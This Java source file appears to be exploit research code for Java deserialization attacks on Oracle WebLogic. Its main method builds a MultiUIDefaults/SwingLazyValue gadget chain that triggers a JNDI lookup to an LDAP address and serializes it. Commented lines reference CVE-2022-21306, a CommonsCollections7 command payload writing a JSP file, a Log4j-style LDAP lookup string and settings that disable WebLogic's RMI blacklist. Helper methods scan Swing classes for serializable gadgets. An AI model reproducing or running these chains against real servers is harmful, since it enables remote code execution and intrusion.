package javax.swing.plaf.synth;

//import javax.swing.plaf.synth.*;

import com._51pwn.Tools;
import sun.swing.SwingLazyValue;
import weblogic.tools.ui.SortedComboBox;

import javax.swing.*;
import java.io.Externalizable;
import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

import static java.lang.System.out;


public class Main {
    public static void XX1(){
        String szPath = "javax.swing.plaf.metal.";
        String []a = {"BumpBuffer",
                "DefaultMetalTheme",
                "MetalBorders",
                "MetalBumps",
                "MetalButtonUI",
                "MetalCheckBoxIcon",
                "MetalCheckBoxUI",
                "MetalComboBoxButton",
                "MetalComboBoxEditor",
                "MetalComboBoxIcon",
                "MetalComboBoxUI",
                "MetalDesktopIconUI",
                "MetalFileChooserUI",
                "MetalFontDesktopProperty",
                "MetalHighContrastTheme",
                "MetalIconFactory",
                "MetalInternalFrameTitlePane",
                "MetalInternalFrameUI",
                "MetalLabelUI",
                "MetalLookAndFeel",
                "MetalMenuBarUI",
                "MetalPopupMenuSeparatorUI",
                "MetalProgressBarUI",
                "MetalRadioButtonUI",
                "MetalRootPaneUI",
                "MetalScrollBarUI",
                "MetalScrollButton",
                "MetalScrollPaneUI",
                "MetalSeparatorUI",
                "MetalSliderUI",
                "MetalSplitPaneDivider",
                "MetalSplitPaneUI",
                "MetalTabbedPaneUI",
                "MetalTextFieldUI",
                "MetalTheme",
                "MetalTitlePane",
                "MetalToggleButtonUI",
                "MetalToolBarUI",
                "MetalToolTipUI",
                "MetalTreeUI",
                "MetalUtils",
                "OceanTheme"};
        TestIsSer(a,szPath);

    }

    public static Class[]AppendClass(Class c,Class []a){
        Class []a1 = new Class[a.length + 1];
        for(int i = 0; i < a.length; i++)
        {
            a1[i] = a[i];
        }
        a1[a.length] = c;
        return a1;
    }
    public  static boolean GetInterface(Class c,Class []p){
        if (null == c){
            return false;
        }
        Class []a=c.getInterfaces();
//        Class p1 = c;
//        for(;0==a.length;){
//            p1 = c.getSuperclass();
//            a = p1.getInterfaces();
//            p = AppendClass(p1,p);
//            if (Object.class == p1){
//                return false;
//            }
//        }
        for (int i = 0; i < a.length;i++){
            String s1 = a[i].getName();
            String s2 = Serializable.class.getName();
            String s3 = Externalizable.class.getName();
            if (s1 == s2 || s1 == s3) {
                for (int j = 0; j < p.length;j++){
                    if (0 < j && p[j] ==  p[j-1]){
                        continue;
                    }
                    out.print(p[j].getName() + " ");
                }
                out.println(s1);
                return true;
            }else{
                if(GetInterface(a[i],AppendClass(a[i],p))){
                    return true;
                }
                if(GetInterface(a[i].getSuperclass(),AppendClass(a[i].getSuperclass(),p))){
                    return true;
                }
            }
        }
        return GetInterface(c.getSuperclass(),AppendClass(c.getSuperclass(),p));
    }

    public static void main(String []args) throws Exception {
        System.setProperty("sun.io.serialization.extendedDebugInfo", "false");
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");

//        javax.swing.MultiUIDefaults.toString
//        UIDefaults.get
//        UIDefaults.getFromHashTable
//        UIDefaults$LazyValue.createValue
//        SwingLazyValue.createValue
//        javax.naming.InitialContext.doLookup()

        UIDefaults uiDefaults = new UIDefaults();
        uiDefaults.put("aaa", new SwingLazyValue("javax.naming.InitialContext", "doLookup", new Object[]{"ldap://127.0.0.1:6666"}));
        Class<?> aClass = Class.forName("javax.swing.MultiUIDefaults");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(UIDefaults[].class);
        declaredConstructor.setAccessible(true);
        Object o = declaredConstructor.newInstance(new Object[]{new UIDefaults[]{uiDefaults}});
        Tools.WtOo1(o);

//        XX1();
        Package cc = Class.forName("javax.swing.plaf.metal.MetalBumps").getPackage();
//        Class o = Class.forName("javax.swing.plaf.synth.SynthArrowButton");//.newInstance();
//        Constructor m = o.getConstructor();
//        Object o11 = m.newInstance(1);

        String []a={"ColorType",
                "DefaultSynthStyleFactory",
                "ImagePainter",
                "ParsedSynthStyle",
                "Region",
                "SynthArrowButton",
                "SynthBorder",
                "SynthButtonUI",
                "SynthCheckBoxMenuItemUI",
                "SynthCheckBoxUI",
                "SynthColorChooserUI",
                "SynthComboBoxUI",
                "SynthComboPopup",
                "SynthContext",
                "SynthDefaultLookup",
                "SynthDesktopIconUI",
                "SynthDesktopPaneUI",
                "SynthEditorPaneUI",
                "SynthFormattedTextFieldUI",
                "SynthGraphicsUtils",
                "SynthInternalFrameTitlePane",
                "SynthInternalFrameUI",
                "SynthLabelUI",
                "SynthListUI",
                "SynthLookAndFeel",
                "SynthMenuBarUI",
                "SynthMenuItemLayoutHelper",
                "SynthMenuItemUI",
                "SynthMenuLayout",
                "SynthMenuUI",
                "SynthOptionPaneUI",
                "SynthPainter",
                "SynthPanelUI",
                "SynthParser",
                "SynthPasswordFieldUI",
                "SynthPopupMenuUI",
                "SynthProgressBarUI",
                "SynthRadioButtonMenuItemUI",
                "SynthRadioButtonUI",
                "SynthRootPaneUI",
                "SynthScrollBarUI",
                "SynthScrollPaneUI",
                "SynthSeparatorUI",
                "SynthSliderUI",
                "SynthSpinnerUI",
                "SynthSplitPaneDivider",
                "SynthSplitPaneUI",
                "SynthStyle",
                "SynthStyleFactory",
                "SynthTabbedPaneUI",
                "SynthTableHeaderUI",
                "SynthTableUI",
                "SynthTextAreaUI",
                "SynthTextFieldUI",
                "SynthTextPaneUI",
                "SynthToggleButtonUI",
                "SynthToolBarUI",
                "SynthToolTipUI",
                "SynthTreeUI",
                "SynthViewportUI"};
        // javax.swing.plaf.synth.SynthLookAndFeel
//        Class c = Class.forName("javax.swing.plaf.synth.SynthLookAndFeel");
////        Field[]fd = c.getDeclaredFields();
//        GetFields(c);
//        GetFCls();
////        out.println(c.getSuperclass().getSuperclass().getName());
//        Class []c1=c.getSuperclass().getSuperclass().getInterfaces();
//        TestIsSer(a,"javax.swing.plaf.synth.");
//        XX1();

//        SynthLookAndFeel xx = new javax.swing.plaf.synth.SynthLookAndFeel();
//        FileOutputStream fos = new FileOutputStream("CVE-2022-21306.dat");
//        ObjectOutputStream oos = new ObjectOutputStream(fos);
//        oos.writeObject(xx);
//        oos.close();
//        fos.close();
//        WtOo("javax.swing.plaf.synth.SynthLookAndFeel");
        // T3 被拒绝了，后续尝试下 IIOP
//        Object o1 = Class.forName("oracle.jdbc.pool.OraclePooledConnection").newInstance();
//        Reflections.setFieldValue(o1, "connectionProperty", new CommonsCollections7().getObject("touch x3.jsp"));
//        WtOo1(o1);

//        Object o1 = Class.forName("org.apache.commons.fileupload.disk.DiskFileItem").newInstance();
//        WLLog4jLogEvent wlle = new WLLog4jLogEvent();
//        Reflections.setFieldValue(wlle, "msgId", "${ldap://docker.for.mac.localhost:1389/UpX34defineClass}");
//        WtOo1(wlle);

//        ssClass();

//        WtOo("javax.swing.plaf.metal.MetalLookAndFeel");
//        RdOo();

//        System.setProperty("weblogic.rmi.blacklist","");
//        System.setProperty("weblogic.rmi.disableblacklist","true");
//        System.setProperty("weblogic.rmi.disabledefaultblacklist","true");
    }

    public static void GetFCls() {
//        String []a = {"javax.swing.plaf.synth.SynthArrowButton",
//                "javax.swing.plaf.synth.SynthBorder",
//                "javax.swing.plaf.synth.SynthComboPopup",// 不是public
//                "javax.swing.plaf.synth.SynthInternalFrameTitlePane",
//                "javax.swing.plaf.synth.SynthLookAndFeel",
//                "javax.swing.plaf.synth.SynthMenuLayout",
//                "javax.swing.plaf.synth.SynthSplitPaneDivider",
//                "javax.swing.plaf.metal.MetalCheckBoxIcon",
//                "javax.swing.plaf.metal.MetalComboBoxButton",
//                "javax.swing.plaf.metal.MetalComboBoxIcon",
//                "javax.swing.plaf.metal.MetalIconFactory",
//                "javax.swing.plaf.metal.MetalInternalFrameTitlePane",
//                "javax.swing.plaf.metal.MetalLookAndFeel",
//                "javax.swing.plaf.metal.MetalScrollButton",
//                "javax.swing.plaf.metal.MetalSplitPaneDivider",
//                "javax.swing.plaf.metal.MetalTitlePane"};
        String []a = {
                "javax.swing.plaf.synth.SynthLookAndFeel"
                };

//        String []a = {"java.util.Set;",
//                "java.awt.Color",
//                "java.awt.Cursor",
//                "java.awt.Dimension",
//                "java.awt.Font",
//                "java.awt.Insets",
//                "java.awt.LightweightDispatcher",
//                "java.awt.dnd.DropTarget",
//                "java.beans.PropertyChangeSupport",
//                "java.beans.VetoableChangeSupport",
//                "java.util.Locale",
//                "java.util.Vector",
//                "javax.swing.ActionMap",
//                "javax.swing.ComponentInputMap",
//                "javax.swing.InputMap",
//                "javax.swing.JComboBox",
//                "javax.swing.JList",
//                "javax.swing.JPopupMenu",
//                "javax.swing.JScrollPane",
//                "javax.swing.Timer",
//                "javax.swing.event.EventListenerList",
//                "javax.swing.plaf.basic.BasicComboPopup$Handler"};

        for(int i =0; i < a.length;i++){
            try{
                Class c11 = Class.forName(a[i]);
//                c11.newInstance();
                out.println("## 类："+a[i] + "\n```");
                GetFields(c11);
                out.println("```");
            }catch (Exception e){
//                out.println("类："+a[i]);
//                e.printStackTrace();
            }
        }
    }

    // 序列化非 public class
    public static void ssClass(){
        try {
            Class c1 = Class.forName("javax.swing.plaf.synth.SynthComboPopup");
            Constructor ct =  c1.getConstructor(JComboBox.class);
            ct.setAccessible(true);
            Object oo1 = ct.newInstance(new SortedComboBox());
//            Object oo1 = new javax.swing.plaf.synth.SynthComboPopup(new SortedComboBox());
            Tools.WtOo1(oo1);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static boolean GetFields(Class c){
        Field[]fd = c.getDeclaredFields();
        boolean bRst = false;
        for(int i = 0; i<fd.length;i++){
            String s11=Modifier.toString(fd[i].getModifiers());
            if(java.lang.String.class == fd[i].getType() ||
                    -1 < s11.indexOf("static") || -1 < s11.indexOf("final")|| -1 < s11.indexOf("transient") || -1 < s11.indexOf("native") ){
                continue;
            }

            Class []c11 = {fd[i].getType()};
//            out.println("属性名：" + fd[i].getName() + " " + fd[i].getType().getName());
            if (GetInterface(fd[i].getType(),c11)){
                bRst = true;
                out.println(fd[i].getName() + " " + fd[i].getType().getName() + " " + fd[i].getDeclaringClass().getName() + " 支持序列化\n");
//                GetFields(fd[i].getType().getClass());
            }
        }
        c = c.getSuperclass();
        if(Object.class !=c){
            if(GetFields(c)){
                bRst = true;
            }
        }
        return bRst;
    }

    public static void TestIsSer(String []a,String szPath){
        for (int i =0; i < a.length;i++){
            String szName = szPath + a[i];
            try {
//                Object o1 = Class.forName(szName).newInstance();
//                if (o1 instanceof Serializable || o1 instanceof Externalizable) {
//                    System.out.println(szName);
//                }
                Class c = Class.forName(szName);
                Class []c1 = {c};
                GetInterface(c,c1);
            }catch (Exception e){
////                System.out.println("err: " + szName);
            }
        }
    }
    // cat user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

}
